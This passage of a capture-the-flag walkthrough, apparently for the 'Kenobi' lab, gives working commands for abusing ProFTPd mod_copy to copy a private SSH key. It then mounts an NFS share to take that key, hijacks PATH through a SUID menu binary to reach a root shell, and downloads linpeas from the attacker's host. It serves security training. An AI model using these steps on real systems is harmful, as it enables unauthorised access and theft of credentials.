</span></span><span style=display:flex><span>ProFTPd <span style=color:#ae81ff>1.3.5</span> <span style=color:#f92672>-</span> <span style=color:#e6db74>&#39;mod_copy&#39;</span> Remote Command Execution                                                                                                      <span style=color:#f92672>|</span> linux<span style=color:#f92672>/</span>remote<span style=color:#f92672>/</span><span style=color:#ae81ff>36803.</span>py
</span></span><span style=display:flex><span>ProFTPd <span style=color:#ae81ff>1.3.5</span> <span style=color:#f92672>-</span> <span style=color:#e6db74>&#39;mod_copy&#39;</span> Remote Command Execution (<span style=color:#ae81ff>2</span>)                                                                                                  <span style=color:#f92672>|</span> linux<span style=color:#f92672>/</span>remote<span style=color:#f92672>/</span><span style=color:#ae81ff>49908.</span>py
</span></span><span style=display:flex><span>ProFTPd <span style=color:#ae81ff>1.3.5</span> <span style=color:#f92672>-</span> File Copy                                                                                                                                <span style=color:#f92672>|</span> linux<span style=color:#f92672>/</span>remote<span style=color:#f92672>/</span><span style=color:#ae81ff>36742.</span>txt
</span></span><span style=display:flex><span><span style=color:#f92672>---------------------------------------------------------------------------------------------------------------------------------------------------------</span> <span style=color:#f92672>---------------------------------</span>
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span></code></pre></div><h1 id=exploitation>Exploitation
<a class=anchor href=#exploitation>#</a></h1><p>Using this we can copy files in the target. So, we will copy the id_rsa file to the /var directory and then mount the /var directory to our machine.</p><p>Let&rsquo;s connect to ftp and copy the files.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>nc 10.10.112.104 <span style=color:#ae81ff>21</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>SITE CPFR /home/kenobi/.ssh/id_rsa
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>SITE CPTO /var/tmp/id_rsa
</span></span></code></pre></div><blockquote><p><a href=http://www.proftpd.org/docs/contrib/mod_copy.html>http://www.proftpd.org/docs/contrib/mod_copy.html</a></p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>SITE CPFR
</span></span><span style=display:flex><span>This SITE command specifies the source file<span style=color:#f92672>/</span>directory to use <span style=color:#66d9ef>for</span> copying <span style=color:#f92672>from</span> one place to another directly on the server<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>The syntax <span style=color:#66d9ef>for</span> SITE CPFR <span style=color:#f92672>is</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  SITE CPFR source<span style=color:#f92672>-</span>path
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>SITE CPTO
</span></span><span style=display:flex><span>This SITE command specifies the destination file<span style=color:#f92672>/</span>directory to use <span style=color:#66d9ef>for</span> copying <span style=color:#f92672>from</span> one place to another directly on the server<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>The syntax <span style=color:#66d9ef>for</span> SITE CPTO <span style=color:#f92672>is</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  SITE CPTO destination<span style=color:#f92672>-</span>path 
</span></span><span style=display:flex><span>A client wishing to copy a file<span style=color:#f92672>/</span>directory first sends a SITE CPFR command, then a SITE CPTO; this <span style=color:#f92672>is</span> similar to how renames are handled using RNFR <span style=color:#f92672>and</span> RNTO<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Use of these SITE command can be controlled via <span style=color:#f92672>&lt;</span>Limit<span style=color:#f92672>&gt;</span> sections, e<span style=color:#f92672>.</span>g<span style=color:#f92672>.</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;</span>Limit SITE_COPY<span style=color:#f92672>&gt;</span>
</span></span><span style=display:flex><span>    AllowUser alex
</span></span><span style=display:flex><span>    DenyAll
</span></span><span style=display:flex><span>  <span style=color:#f92672>&lt;/</span>Limit<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> nc <span style=color:#ae81ff>10.10.112.104</span> <span style=color:#ae81ff>21</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>220</span> ProFTPD <span style=color:#ae81ff>1.3.5</span> Server (ProFTPD Default Installation) [<span style=color:#ae81ff>10.10.112.104</span>]
</span></span><span style=display:flex><span>SITE CPFR <span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>kenobi<span style=color:#f92672>/.</span>ssh<span style=color:#f92672>/</span>id_rsa
</span></span><span style=display:flex><span><span style=color:#ae81ff>350</span> File <span style=color:#f92672>or</span> directory exists, ready <span style=color:#66d9ef>for</span> destination name
</span></span><span style=display:flex><span>SITE CPTO <span style=color:#f92672>/</span>var<span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>id_rsa
</span></span><span style=display:flex><span><span style=color:#ae81ff>250</span> Copy successful
</span></span></code></pre></div><p>Now we will mount the /var directory to our machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>mkdir /mnt/kenobi
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>mount 10.10.112.104:/var /mnt/kenobi
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>cd /mnt/kenobi
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> mkdir <span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>kenobi
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> mount <span style=color:#ae81ff>10.10.112.104</span>:<span style=color:#f92672>/</span>var <span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>kenobi
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> cd <span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>kenobi
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> ls <span style=color:#f92672>-</span>la
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>56</span>
</span></span><span style=display:flex><span>drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>14</span> root root  <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> <span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x  <span style=color:#ae81ff>4</span> root root  <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>01</span>:<span style=color:#ae81ff>01</span> <span style=color:#f92672>..</span>
</span></span><span style=display:flex><span>drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x  <span style=color:#ae81ff>2</span> root root  <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> backups
</span></span><span style=display:flex><span>drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x  <span style=color:#ae81ff>9</span> root root  <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> cache
</span></span><span style=display:flex><span>drwxrwxrwt  <span style=color:#ae81ff>2</span> root root  <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> crash
</span></span><span style=display:flex><span>drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>40</span> root root  <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> lib
</span></span><span style=display:flex><span>drwxrwsr<span style=color:#f92672>-</span>x  <span style=color:#ae81ff>2</span> root staff <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>12</span>  <span style=color:#ae81ff>2016</span> local
</span></span><span style=display:flex><span>lrwxrwxrwx  <span style=color:#ae81ff>1</span> root root     <span style=color:#ae81ff>9</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> lock <span style=color:#f92672>-&gt;</span> <span style=color:#f92672>/</span>run<span style=color:#f92672>/</span>lock
</span></span><span style=display:flex><span>drwxrwxr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>10</span> root tss   <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> log
</span></span><span style=display:flex><span>drwxrwsr<span style=color:#f92672>-</span>x  <span style=color:#ae81ff>2</span> root mail  <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>26</span>  <span style=color:#ae81ff>2019</span> mail
</span></span><span style=display:flex><span>drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x  <span style=color:#ae81ff>2</span> root root  <span style=color:#ae81ff>4096</span> Feb <span style=color:#ae81ff>26</span>  <span style=color:#ae81ff>2019</span> opt
</span></span><span style=display:flex><span>lrwxrwxrwx  <span style=color:#ae81ff>1</span> root root     <span style=color:#ae81ff>4</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> run <span style=color:#f92672>-&gt;</span> <span style=color:#f92672>/</span>run
</span></span><span style=display:flex><span>drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x  <span style=color:#ae81ff>2</span> root root  <span style=color:#ae81ff>4096</span> Jan <span style=color:#ae81ff>29</span>  <span style=color:#ae81ff>2019</span> snap
</span></span><span style=display:flex><span>drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x  <span style=color:#ae81ff>5</span> root root  <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> spool
</span></span><span style=display:flex><span>drwxrwxrwt  <span style=color:#ae81ff>6</span> root root  <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>01</span>:<span style=color:#ae81ff>00</span> tmp
</span></span><span style=display:flex><span>drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x  <span style=color:#ae81ff>3</span> root root  <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> www
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> cd tmp<span style=color:#f92672>/</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> ls <span style=color:#f92672>-</span>la
</span></span><span style=display:flex><span>total <span style=color:#ae81ff>28</span>
</span></span><span style=display:flex><span>drwxrwxrwt  <span style=color:#ae81ff>6</span> root root <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>01</span>:<span style=color:#ae81ff>00</span> <span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>drwxr<span style=color:#f92672>-</span>xr<span style=color:#f92672>-</span>x <span style=color:#ae81ff>14</span> root root <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> <span style=color:#f92672>..</span>
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>rw<span style=color:#f92672>-</span>r<span style=color:#f92672>--</span>r<span style=color:#f92672>--</span>  <span style=color:#ae81ff>1</span> kali kali <span style=color:#ae81ff>1675</span> May <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>01</span>:<span style=color:#ae81ff>00</span> id_rsa
</span></span><span style=display:flex><span>drwx<span style=color:#f92672>------</span>  <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>25</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>43</span> systemd<span style=color:#f92672>-</span>private<span style=color:#f92672>-</span><span style=color:#ae81ff>1e920</span>d8729fd40e9bedb6b724b8b7e62<span style=color:#f92672>-</span>systemd<span style=color:#f92672>-</span>timesyncd<span style=color:#f92672>.</span>service<span style=color:#f92672>-</span>HJEhTc
</span></span><span style=display:flex><span>drwx<span style=color:#f92672>------</span>  <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> systemd<span style=color:#f92672>-</span>private<span style=color:#f92672>-</span><span style=color:#ae81ff>2408059707</span>bc41329243d2fc9e613f1e<span style=color:#f92672>-</span>systemd<span style=color:#f92672>-</span>timesyncd<span style=color:#f92672>.</span>service<span style=color:#f92672>-</span>a5PktM
</span></span><span style=display:flex><span>drwx<span style=color:#f92672>------</span>  <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> systemd<span style=color:#f92672>-</span>private<span style=color:#f92672>-</span><span style=color:#ae81ff>6</span>f4acd341c0b40569c92cee906c3edc9<span style=color:#f92672>-</span>systemd<span style=color:#f92672>-</span>timesyncd<span style=color:#f92672>.</span>service<span style=color:#f92672>-</span>z5o4Aw
</span></span><span style=display:flex><span>drwx<span style=color:#f92672>------</span>  <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> Sep  <span style=color:#ae81ff>4</span>  <span style=color:#ae81ff>2019</span> systemd<span style=color:#f92672>-</span>private<span style=color:#f92672>-</span>e69bbb0653ce4ee3bd9ae0d93d2a5806<span style=color:#f92672>-</span>systemd<span style=color:#f92672>-</span>timesyncd<span style=color:#f92672>.</span>service<span style=color:#f92672>-</span>zObUdn
</span></span><span style=display:flex><span>root<span style=color:#a6e22e>@kali</span> <span style=color:#f92672>/</span>mnt<span style=color:#f92672>/</span>kenobi<span style=color:#f92672>/</span>tmp <span style=color:#960050;background-color:#1e0010>❯</span> 
</span></span></code></pre></div><p>We can see the file, we will copy it to our machine and change the permissions for the file. Now ssh into the target as user kenobi.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> id_rsa
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>ssh kenobi@10.10.112.104 -i id rsa
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>❯</span> ssh kenobi<span style=color:#f92672>@</span><span style=color:#ae81ff>10.10.112.104</span> <span style=color:#f92672>-</span>i id_rsa
</span></span><span style=display:flex><span>Welcome to Ubuntu <span style=color:#ae81ff>16.04.6</span> LTS (GNU<span style=color:#f92672>/</span>Linux <span style=color:#ae81ff>4.8.0</span><span style=color:#f92672>-</span><span style=color:#ae81ff>58</span><span style=color:#f92672>-</span>generic x86_64)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> <span style=color:#f92672>*</span> Documentation:  https:<span style=color:#f92672>//</span>help<span style=color:#f92672>.</span>ubuntu<span style=color:#f92672>.</span>com
</span></span><span style=display:flex><span> <span style=color:#f92672>*</span> Management:     https:<span style=color:#f92672>//</span>landscape<span style=color:#f92672>.</span>canonical<span style=color:#f92672>.</span>com
</span></span><span style=display:flex><span> <span style=color:#f92672>*</span> Support:        https:<span style=color:#f92672>//</span>ubuntu<span style=color:#f92672>.</span>com<span style=color:#f92672>/</span>advantage
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>103</span> packages can be updated<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>65</span> updates are security updates<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Last login: Wed Sep  <span style=color:#ae81ff>4</span> <span style=color:#ae81ff>07</span>:<span style=color:#ae81ff>10</span>:<span style=color:#ae81ff>15</span> <span style=color:#ae81ff>2019</span> <span style=color:#f92672>from</span> <span style=color:#ae81ff>192.168.1.147</span>
</span></span><span style=display:flex><span>To run a command <span style=color:#66d9ef>as</span> administrator (user <span style=color:#e6db74>&#34;root&#34;</span>), use <span style=color:#e6db74>&#34;sudo &lt;command&gt;&#34;</span><span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>See <span style=color:#e6db74>&#34;man sudo_root&#34;</span> <span style=color:#66d9ef>for</span> details<span style=color:#f92672>.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>$</span>
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>$</span> id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>(kenobi) gid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>(kenobi) groups<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>(kenobi),<span style=color:#ae81ff>4</span>(adm),<span style=color:#ae81ff>24</span>(cdrom),<span style=color:#ae81ff>27</span>(sudo),<span style=color:#ae81ff>30</span>(dip),<span style=color:#ae81ff>46</span>(plugdev),<span style=color:#ae81ff>110</span>(lxd),<span style=color:#ae81ff>113</span>(lpadmin),<span style=color:#ae81ff>114</span>(sambashare)
</span></span></code></pre></div><p>We&rsquo;re logged in as kenobi.</p><h1 id=privilege-escalation>Privilege Escalation
<a class=anchor href=#privilege-escalation>#</a></h1><h2 id=approach-1>Approach 1
<a class=anchor href=#approach-1>#</a></h2><p>We will find the files with SUID bit set.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>find / -perm -u<span style=color:#f92672>=</span>s -type f 2&gt;/dev/null
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>$</span> find <span style=color:#f92672>/</span> <span style=color:#f92672>-</span>perm <span style=color:#f92672>-</span>u<span style=color:#f92672>=</span>s <span style=color:#f92672>-</span>type f <span style=color:#ae81ff>2</span><span style=color:#f92672>&gt;/</span>dev<span style=color:#f92672>/</span>null
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>sbin<span style=color:#f92672>/</span>mount<span style=color:#f92672>.</span>nfs
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>policykit<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>/</span>polkit<span style=color:#f92672>-</span>agent<span style=color:#f92672>-</span>helper<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>dbus<span style=color:#f92672>-</span><span style=color:#ae81ff>1.0</span><span style=color:#f92672>/</span>dbus<span style=color:#f92672>-</span>daemon<span style=color:#f92672>-</span>launch<span style=color:#f92672>-</span>helper
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>snapd<span style=color:#f92672>/</span>snap<span style=color:#f92672>-</span>confine
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>eject<span style=color:#f92672>/</span>dmcrypt<span style=color:#f92672>-</span>get<span style=color:#f92672>-</span>device
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>openssh<span style=color:#f92672>/</span>ssh<span style=color:#f92672>-</span>keysign
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>x86_64<span style=color:#f92672>-</span>linux<span style=color:#f92672>-</span>gnu<span style=color:#f92672>/</span>lxc<span style=color:#f92672>/</span>lxc<span style=color:#f92672>-</span>user<span style=color:#f92672>-</span>nic
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>chfn
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>newgidmap
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>pkexec
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>passwd
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>newuidmap
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>gpasswd
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>menu
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>sudo
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>chsh
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>at
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>newgrp
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>umount
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>fusermount
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>mount
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>ping
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>su
</span></span><span style=display:flex><span><span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>ping6
</span></span></code></pre></div><p>/usr/bin/menu seems to be unusual among the list of file that we got.</p><p>When we execute that binary, we can see a couple of commands that can be executed. We will now manipulate the PATH variable to get our root shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>$</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>menu
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>***************************************</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1.</span> status check
</span></span><span style=display:flex><span><span style=color:#ae81ff>2.</span> kernel version
</span></span><span style=display:flex><span><span style=color:#ae81ff>3.</span> ifconfig
</span></span><span style=display:flex><span><span style=color:#f92672>**</span> Enter your choice :<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>HTTP<span style=color:#f92672>/</span><span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>200</span> OK
</span></span><span style=display:flex><span>Date: Sat, <span style=color:#ae81ff>25</span> May <span style=color:#ae81ff>2024</span> <span style=color:#ae81ff>05</span>:<span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>29</span> GMT
</span></span><span style=display:flex><span>Server: Apache<span style=color:#f92672>/</span><span style=color:#ae81ff>2.4.18</span> (Ubuntu)
</span></span><span style=display:flex><span>Last<span style=color:#f92672>-</span>Modified: Wed, <span style=color:#ae81ff>04</span> Sep <span style=color:#ae81ff>2019</span> <span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>07</span>:<span style=color:#ae81ff>20</span> GMT
</span></span><span style=display:flex><span>ETag: <span style=color:#e6db74>&#34;c8-591b6884b6ed2&#34;</span>
</span></span><span style=display:flex><span>Accept<span style=color:#f92672>-</span>Ranges: bytes
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Length: <span style=color:#ae81ff>200</span>
</span></span><span style=display:flex><span>Vary: Accept<span style=color:#f92672>-</span>Encoding
</span></span><span style=display:flex><span>Content<span style=color:#f92672>-</span>Type: text<span style=color:#f92672>/</span>html
</span></span></code></pre></div><p>When we used the first command to test what that does, we can see it is using curl to run the status check. Now, we will replace the functionality of the curl command in the status check with the /bin/sh and add it to the path so that we can get the shell as soon it gets executed.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>~</span><span style=color:#960050;background-color:#1e0010>$</span> cd <span style=color:#f92672>/</span>tmp<span style=color:#f92672>/</span>
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#960050;background-color:#1e0010>$</span> echo <span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>sh <span style=color:#f92672>&gt;</span> curl
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#960050;background-color:#1e0010>$</span> chmod <span style=color:#ae81ff>777</span> curl
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#960050;background-color:#1e0010>$</span> export PATH<span style=color:#f92672>=/</span>tmp:<span style=color:#960050;background-color:#1e0010>$</span>PATH
</span></span><span style=display:flex><span>kenobi<span style=color:#a6e22e>@kenobi</span>:<span style=color:#f92672>/</span>tmp<span style=color:#960050;background-color:#1e0010>$</span> <span style=color:#f92672>/</span>usr<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>menu
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>***************************************</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>1.</span> status check
</span></span><span style=display:flex><span><span style=color:#ae81ff>2.</span> kernel version
</span></span><span style=display:flex><span><span style=color:#ae81ff>3.</span> ifconfig
</span></span><span style=display:flex><span><span style=color:#f92672>**</span> Enter your choice :<span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#75715e># id</span>
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>(root) gid<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>(kenobi) groups<span style=color:#f92672>=</span><span style=color:#ae81ff>1000</span>(kenobi),<span style=color:#ae81ff>4</span>(adm),<span style=color:#ae81ff>24</span>(cdrom),<span style=color:#ae81ff>27</span>(sudo),<span style=color:#ae81ff>30</span>(dip),<span style=color:#ae81ff>46</span>(plugdev),<span style=color:#ae81ff>110</span>(lxd),<span style=color:#ae81ff>113</span>(lpadmin),<span style=color:#ae81ff>114</span>(sambashare)
</span></span><span style=display:flex><span><span style=color:#75715e>#</span>
</span></span></code></pre></div><p>We are root!!!</p><h2 id=approach-2>Approach 2
<a class=anchor href=#approach-2>#</a></h2><p>Start the python http server and download linpeas.sh to the target machine.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>python -m http.server <span style=color:#ae81ff>1111</span>
</span></span></code></pre></div><blockquote><p>On target machine</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>wet http: //10.6.29.149:1111/linpeas.sh
</span></span></code></pre></div><p>Change the file permissions to executable and run the file.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>chmod +x linpeas.sh
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>./linpeas.sh
